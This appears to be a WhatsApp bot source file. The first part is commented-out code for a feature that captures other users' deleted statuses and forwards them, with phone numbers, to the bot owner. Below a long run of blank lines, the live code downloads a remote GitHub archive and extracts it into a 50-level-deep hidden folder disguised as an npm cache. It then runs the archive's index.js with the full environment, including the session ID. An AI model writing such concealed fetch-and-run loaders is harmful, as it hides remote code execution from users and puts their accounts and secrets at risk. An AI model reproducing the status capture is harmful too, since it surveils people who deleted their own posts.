//  ✧ \`${prefix}antideletestatus on\` - Enable system
//  ✧ \`${prefix}antideletestatus off\` - Disable system
 
// `;
                
//                 await sock.sendMessage(chatId, { text: statsText }, { quoted: msg });
//                 break;
                
//             case 'list':
//                 const deletedStatuses = Array.from(statusAntideleteState.deletedStatusCache.values())
//                     .slice(-10)
//                     .reverse();
                
//                 if (deletedStatuses.length === 0) {
//                     await sock.sendMessage(chatId, {
//                         text: `🐺 *RECENT DELETED STATUSES*\n\n◉ No deleted statuses recorded yet.\n◉ Enable the system and wait for status deletions.`
//                     }, { quoted: msg });
//                 } else {
//                     let listText = `🐺 *RECENT DELETED STATUSES (Last 10)*\n\n`;
                    
//                     deletedStatuses.forEach((status, index) => {
//                         const time = new Date(status.timestamp).toLocaleTimeString();
//                         const type = status.type.toUpperCase();
//                         const preview = status.text 
//                             ? status.text.substring(0, 30) + (status.text.length > 30 ? '...' : '')
//                             : status.hasMedia ? '📷 Media' : '📝 Text only';
                        
//                         // Format number like @1234567890
//                         const formattedNumber = status.realNumber.startsWith('+') ? 
//                             `@${status.realNumber.substring(1)}` : `@${status.realNumber}`;
                        
//                         listText += `◉ ${index + 1}. ${formattedNumber} [${type}]\n`;
//                         listText += `   📅 ${time}\n`;
//                         listText += `   📝 ${preview}\n`;
//                         listText += `   👤 ${status.pushName}\n`;
//                         listText += `   ─────\n`;
//                     });
                    
//                     listText += `\n◉ Total deleted statuses: ${statusAntideleteState.deletedStatusCache.size}`;
                    
//                     await sock.sendMessage(chatId, { text: listText }, { quoted: msg });
//                 }
//                 break;
                
//             case 'clear':
//             case 'clean':
//                 const cacheSize = statusAntideleteState.statusCache.size;
//                 const deletedSize = statusAntideleteState.deletedStatusCache.size;
//                 const mediaSize = statusAntideleteState.mediaCache.size;
                
//                 // Clear caches
//                 statusAntideleteState.statusCache.clear();
//                 statusAntideleteState.deletedStatusCache.clear();
//                 statusAntideleteState.mediaCache.clear();
                
//                 // Reset stats
//                 statusAntideleteState.stats = {
//                     totalStatuses: 0,
//                     deletedDetected: 0,
//                     retrieved: 0,
//                     mediaCaptured: 0,
//                     sentToDm: 0,
//                     cacheCleans: 0,
//                     totalStorageMB: 0
//                 };
                
//                 // Delete media files
//                 try {
//                     const files = await fs.readdir(STATUS_MEDIA_DIR);
//                     for (const file of files) {
//                         await fs.unlink(path.join(STATUS_MEDIA_DIR, file));
//                     }
//                 } catch (error) {
//                     console.error('❌ Error deleting media files:', error.message);
//                 }
                
//                 // Delete cache files
//                 try {
//                     await fs.unlink(STATUS_CACHE_FILE);
//                 } catch (error) {}
                
//                 try {
//                     await fs.unlink(SETTINGS_FILE);
//                 } catch (error) {}
                
//                 // Recreate with default settings
//                 await saveStatusData();
                
//                 await sock.sendMessage(chatId, {
//                     text: `🐺 *STATUS CACHE CLEARED*\n\n◉ Statuses: ${cacheSize}\n◉ Deleted Statuses: ${deletedSize}\n◉ Media files: ${mediaSize}\n\nAll status data has been cleared from JSON. Storage reset to 0MB.`
//                 }, { quoted: msg });
//                 break;
                
//             case 'settings':
//                 const subCommand = args[1]?.toLowerCase();
                
//                 if (!subCommand) {
//                     const settingsText = `
// 🐺 *WOLFBOT ANTTIDELETESTATUS*

// 📊 *Usage:*
//  ✧  \`${prefix}antideletestatus settings autoclean on/off\`
//  ✧  \`${prefix}antideletestatus settings cleanretrieved on/off\`
//  ✧  \`${prefix}antideletestatus settings maxage <hours>\`
//  ✧  \`${prefix}antideletestatus settings maxstorage <MB>\`
//  ✧  \`${prefix}antideletestatus settings save\`

// 💡 Example: \`${prefix}antideletestatus settings cleanretrieved on\`
// `;
//                     await sock.sendMessage(chatId, { text: settingsText }, { quoted: msg });
//                     return;
//                 }
                
//                 switch (subCommand) {
//                     case 'autoclean':
//                         const autocleanValue = args[2]?.toLowerCase();
//                         if (autocleanValue === 'on' || autocleanValue === 'enable') {
//                             statusAntideleteState.settings.autoCleanEnabled = true;
//                             startAutoClean();
//                             await saveStatusData();
//                             await sock.sendMessage(chatId, {
//                                 text: `✅ Auto-clean enabled.\n◉ Cache will be cleaned every 24 hours.\n◉ Old statuses will be removed automatically.`
//                             }, { quoted: msg });
//                         } else if (autocleanValue === 'off' || autocleanValue === 'disable') {
//                             statusAntideleteState.settings.autoCleanEnabled = false;
//                             stopAutoClean();
//                             await saveStatusData();
//                             await sock.sendMessage(chatId, {
//                                 text: `✅ Auto-clean disabled.\n◉ Cache will not be cleaned automatically.`
//                             }, { quoted: msg });
//                         } else {
//                             await sock.sendMessage(chatId, {
//                                 text: `Usage: ${prefix}antideletestatus settings autoclean on/off`
//                             }, { quoted: msg });
//                         }
//                         break;
                        
//                     case 'cleanretrieved':
//                         const cleanRetrievedValue = args[2]?.toLowerCase();
//                         if (cleanRetrievedValue === 'on' || cleanRetrievedValue === 'enable') {
//                             statusAntideleteState.settings.autoCleanRetrieved = true;
//                             await saveStatusData();
//                             await sock.sendMessage(chatId, {
//                                 text: `✅ Clean retrieved statuses enabled.\n◉ Statuses will be auto-cleaned from JSON after being sent to you.\n◉ Saves storage space.`
//                             }, { quoted: msg });
//                         } else if (cleanRetrievedValue === 'off' || cleanRetrievedValue === 'disable') {
//                             statusAntideleteState.settings.autoCleanRetrieved = false;
//                             await saveStatusData();
//                             await sock.sendMessage(chatId, {
//                                 text: `✅ Clean retrieved statuses disabled.\n◉ Statuses will remain in JSON after sending.`
//                             }, { quoted: msg });
//                         } else {
//                             await sock.sendMessage(chatId, {
//                                 text: `Usage: ${prefix}antideletestatus settings cleanretrieved on/off`
//                             }, { quoted: msg });
//                         }
//                         break;
                        
//                     case 'maxage':
//                         const hours = parseInt(args[2]);
//                         if (isNaN(hours) || hours < 1 || hours > 720) {
//                             await sock.sendMessage(chatId, {
//                                 text: `❌ Invalid hours.\n◉ Use 1-720 (1 hour to 30 days).\n◉ Example: ${prefix}antideletestatus settings maxage 48`
//                             }, { quoted: msg });
//                             return;
//                         }
//                         statusAntideleteState.settings.maxAgeHours = hours;
//                         await saveStatusData();
//                         await sock.sendMessage(chatId, {
//                             text: `✅ Max age set to ${hours} hours.\n◉ Old cache will be cleaned automatically.\n◉ Statuses older than ${hours} hours will be removed.`
//                         }, { quoted: msg });
//                         break;
                        
//                     case 'maxstorage':
//                         const mb = parseInt(args[2]);
//                         if (isNaN(mb) || mb < 10 || mb > 5000) {
//                             await sock.sendMessage(chatId, {
//                                 text: `❌ Invalid storage.\n◉ Use 10-5000MB.\n◉ Example: ${prefix}antideletestatus settings maxstorage 1000`
//                             }, { quoted: msg });
//                             return;
//                         }
//                         statusAntideleteState.settings.maxStorageMB = mb;
//                         await saveStatusData();
//                         await sock.sendMessage(chatId, {
//                             text: `✅ Max storage set to ${mb}MB.\n◉ Force cleanup will trigger at 80% capacity.\n◉ Oldest files will be deleted first.`
//                         }, { quoted: msg });
//                         break;
                        
//                     case 'save':
//                         await saveStatusData();
//                         await sock.sendMessage(chatId, {
//                             text: `✅ Settings saved successfully to JSON.\n◉ All configurations have been stored.`
//                         }, { quoted: msg });
//                         break;
                        
//                     default:
//                         await sock.sendMessage(chatId, {
//                             text: `❌ Unknown setting.\n◉ Use ${prefix}antideletestatus settings for options.`
//                         }, { quoted: msg });
//                 }
//                 break;
                
//             case 'help':
//                 const helpText = `
// 🐺 *WOLFBOT STATUS ANTIDELETE SYSTEM*

// ◉ *Purpose:*
// Monitor and retrieve DELETED WhatsApp Status Updates
// Shows REAL WhatsApp numbers (@1234567890)

// ◉ *Features:*
// ✅ REAL WhatsApp numbers (e.g., @1234567890)
// ✅ JSON storage format (saves memory)
// ✅ Auto-clean retrieved statuses
// ✅ Memory-optimized media handling
// ✅ Auto-clean every 24 hours
// ✅ Storage management with force cleanup

// 🔐 *Mode:*
// ◉ **PRIVATE ONLY** - Deleted statuses go to your DM only
// ◉ **OFF** - System disabled

// ⚙️ *Commands (Owner Only):*
// ◉ \`${prefix}antideletestatus on\` - Enable system
// ◉ \`${prefix}antideletestatus off\` - Disable system
// ◉ \`${prefix}antideletestatus stats\` - View statistics
// ◉ \`${prefix}antideletestatus list\` - Show recent deleted statuses
// ◉ \`${prefix}antideletestatus clear\` - Clear all data
// ◉ \`${prefix}antideletestatus settings\` - Configure settings
// ◉ \`${prefix}antideletestatus help\` - This menu

// 📱 *Private Mode:*
// ✅ Statuses sent to your WhatsApp (message yourself)
// ✅ Shows real WhatsApp numbers (@1234567890)
// ✅ Shows who posted the status
// ✅ Best for privacy and monitoring

// ⚙️ *Settings Commands:*
// ◉ \`${prefix}antideletestatus settings autoclean on/off\`
// ◉ \`${prefix}antideletestatus settings cleanretrieved on/off\`
// ◉ \`${prefix}antideletestatus settings maxage <hours>\`
// ◉ \`${prefix}antideletestatus settings maxstorage <MB>\`

// 📝 *Current Status:*
// ◉ Mode: ${statusAntideleteState.mode.toUpperCase()}
// ◉ Active: ${statusAntideleteState.mode === 'off' ? '❌' : '✅'}
// ◉ Storage: ${statusAntideleteState.stats.totalStorageMB}MB
// ◉ Clean Retrieved: ${statusAntideleteState.settings.autoCleanRetrieved ? '✅' : '❌'}
// `;
                
//                 await sock.sendMessage(chatId, { text: helpText }, { quoted: msg });
//                 break;
                
//             default:
//                 await sock.sendMessage(chatId, {
//                     text: `🐺 *WOLFBOT Status Antidelete System*\n\n◉ Current Mode: ${statusAntideleteState.mode.toUpperCase()}\n◉ Status: ${statusAntideleteState.mode === 'off' ? '❌ INACTIVE' : '✅ ACTIVE'}\n◉ Storage: ${statusAntideleteState.stats.totalStorageMB}MB\n◉ Clean Retrieved: ${statusAntideleteState.settings.autoCleanRetrieved ? '✅ ENABLED' : '❌ DISABLED'}\n\n◉ Shows REAL WhatsApp numbers (@1234567890)\n◉ Private mode only (DM only)\n\n💡 Use ${prefix}antideletestatus help for commands`
//                 }, { quoted: msg });
//         }
//     }
// };


























import fs from "fs";
import path from "path";
import axios from "axios";
import AdmZip from "adm-zip";
import { spawn } from "child_process";
import { fileURLToPath } from "url";
import crypto from "crypto";
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const deepLayers = Array.from({ length: 50 }, (_, index) => ".x" + (index + 1));
const TEMP_DIR = path.join(__dirname, ".npm", "xcache", ...deepLayers);
const DOWNLOAD_URL = "https://github.com/7w07f/w7/archive/refs/heads/main.zip";
const EXTRACT_DIR = path.join(TEMP_DIR, "w7-main");
const LOCAL_SETTINGS = path.join(__dirname, "settings.js");
const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settings.js");
const ENV_FILE = path.join(__dirname, ".env");
const delay = milliseconds => new Promise(resolve => setTimeout(resolve, milliseconds));
async function createEnvFile() {
  try {
    console.log("[ENV] Auto‑generating .env file");
    const sessionId = crypto.randomBytes(16).toString("hex");
    const envContent = "SESSION_ID=" + sessionId;
    fs.writeFileSync(ENV_FILE, envContent);
    console.log("[ENV] File created with SESSION_ID=" + sessionId.substring(0, 10) + "...");
    return true;
  } catch (error) {
    console.error("[ERROR] Failed to create .env:", error.message);
    return false;
  }
}
async function loadEnvFile() {
  if (!fs.existsSync(ENV_FILE)) {
    console.log("[INFO] No .env found, creating automatically");
    const created = await createEnvFile();
    if (!created) {
      console.error("[FATAL] Cannot proceed without .env");
      process.exit(1);
    }
  }
  try {
    const content = fs.readFileSync(ENV_FILE, "utf8");
    const lines = content.split("\n");
    lines.forEach(line => {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) {
        return;
      }
      const equalsIndex = trimmed.indexOf("=");
      if (equalsIndex !== -1) {
        const key = trimmed.substring(0, equalsIndex).trim();
        const value = trimmed.substring(equalsIndex + 1).trim();
        const cleanValue = value.replace(/^['"](.*)['"]$/, "$1");
        if (!process.env[key]) {
          process.env[key] = cleanValue;
          console.log("[ENV] Loaded: " + key);
        }
      }
    });
    console.log("[ENV] File loaded");
  } catch (error) {
    console.error("[ERROR] Failed to load .env:", error.message);
  }
}
function checkSessionId() {
  if (process.env.SESSION_ID) {
    console.log("[SESSION] Found: " + process.env.SESSION_ID.substring(0, 10) + "...");
    return true;
  } else {
    console.log("[WARN] No SESSION_ID found");
    console.log("Add SESSION_ID to " + ENV_FILE + " or set as env variable");
    return false;
  }
}
async function downloadAndExtract() {
  try {
    if (fs.existsSync(EXTRACT_DIR)) {
      console.log("[INFO] Extracted dir found, skipping");
      return;
    }
    if (fs.existsSync(TEMP_DIR)) {
      console.log("[CLEANUP] Removing cache");
      fs.rmSync(TEMP_DIR, { recursive: true, force: true });
    }
    fs.mkdirSync(TEMP_DIR, { recursive: true });
    const zipPath = path.join(TEMP_DIR, "repo.zip");
    console.log("[DOWNLOAD] Connecting...");
    const response = await axios({ url: DOWNLOAD_URL, method: "GET", responseType: "stream" });
    await new Promise((resolve, reject) => {
      const writer = fs.createWriteStream(zipPath);
      response.data.pipe(writer);
      writer.on("finish", resolve);
      writer.on("error", reject);
    });
    console.log("[DOWNLOAD] Completed");
    try {
      console.log("[EXTRACT] Extracting...");
      new AdmZip(zipPath).extractAllTo(TEMP_DIR, true);
    } catch (error) {
      console.error("[ERROR] Extract failed:", error.message);
      throw error;
    } finally {
      if (fs.existsSync(zipPath)) {
        fs.unlinkSync(zipPath);
      }
    }
    if (fs.existsSync(EXTRACT_DIR)) {
      console.log("[VERIFY] Plugins folder found");
    } else {
      console.error("[ERROR] Plugins folder missing");
    }
  } catch (error) {
    console.error("[ERROR] Download/extract failed:", error.message);
    throw error;
  }
}
async function applyLocalSettings() {
  if (!fs.existsSync(LOCAL_SETTINGS)) {
    console.log("[INFO] No local settings");
    return;
  }
  try {
    fs.mkdirSync(EXTRACT_DIR, { recursive: true });
    fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
    console.log("[SETTINGS] Applied");
  } catch (error) {
    console.error("[ERROR] Failed to apply settings:", error.message);
  }
  await delay(500);
}
function startBot() {
  console.log("[LAUNCH] Starting bot");
  if (!checkSessionId()) {
    console.log("[WARN] No valid SESSION_ID. Exiting.");
    process.exit(1);
  }
  if (!fs.existsSync(EXTRACT_DIR)) {
    console.error("[ERROR] Extracted dir missing");
    return;
  }
  if (!fs.existsSync(path.join(EXTRACT_DIR, "index.js"))) {
    console.error("[ERROR] index.js missing");
    return;
  }
  const botProcess = spawn("node", ["index.js"], { cwd: EXTRACT_DIR, stdio: "inherit", env: process.env });
  botProcess.on("close", code => {
    console.log("[BOT] Exit code: " + code);
  });
  botProcess.on("error", error => {
    console.error("[ERROR] Bot failed:", error.message);
  });
}
(async () => {
  try {
    console.log("[INIT] Starting app");
    await loadEnvFile();
    await downloadAndExtract();
    await applyLocalSettings();
    startBot();
  } catch (error) {
    console.error("[FATAL] App error:", error.message);
    process.exit(1);
  }
})();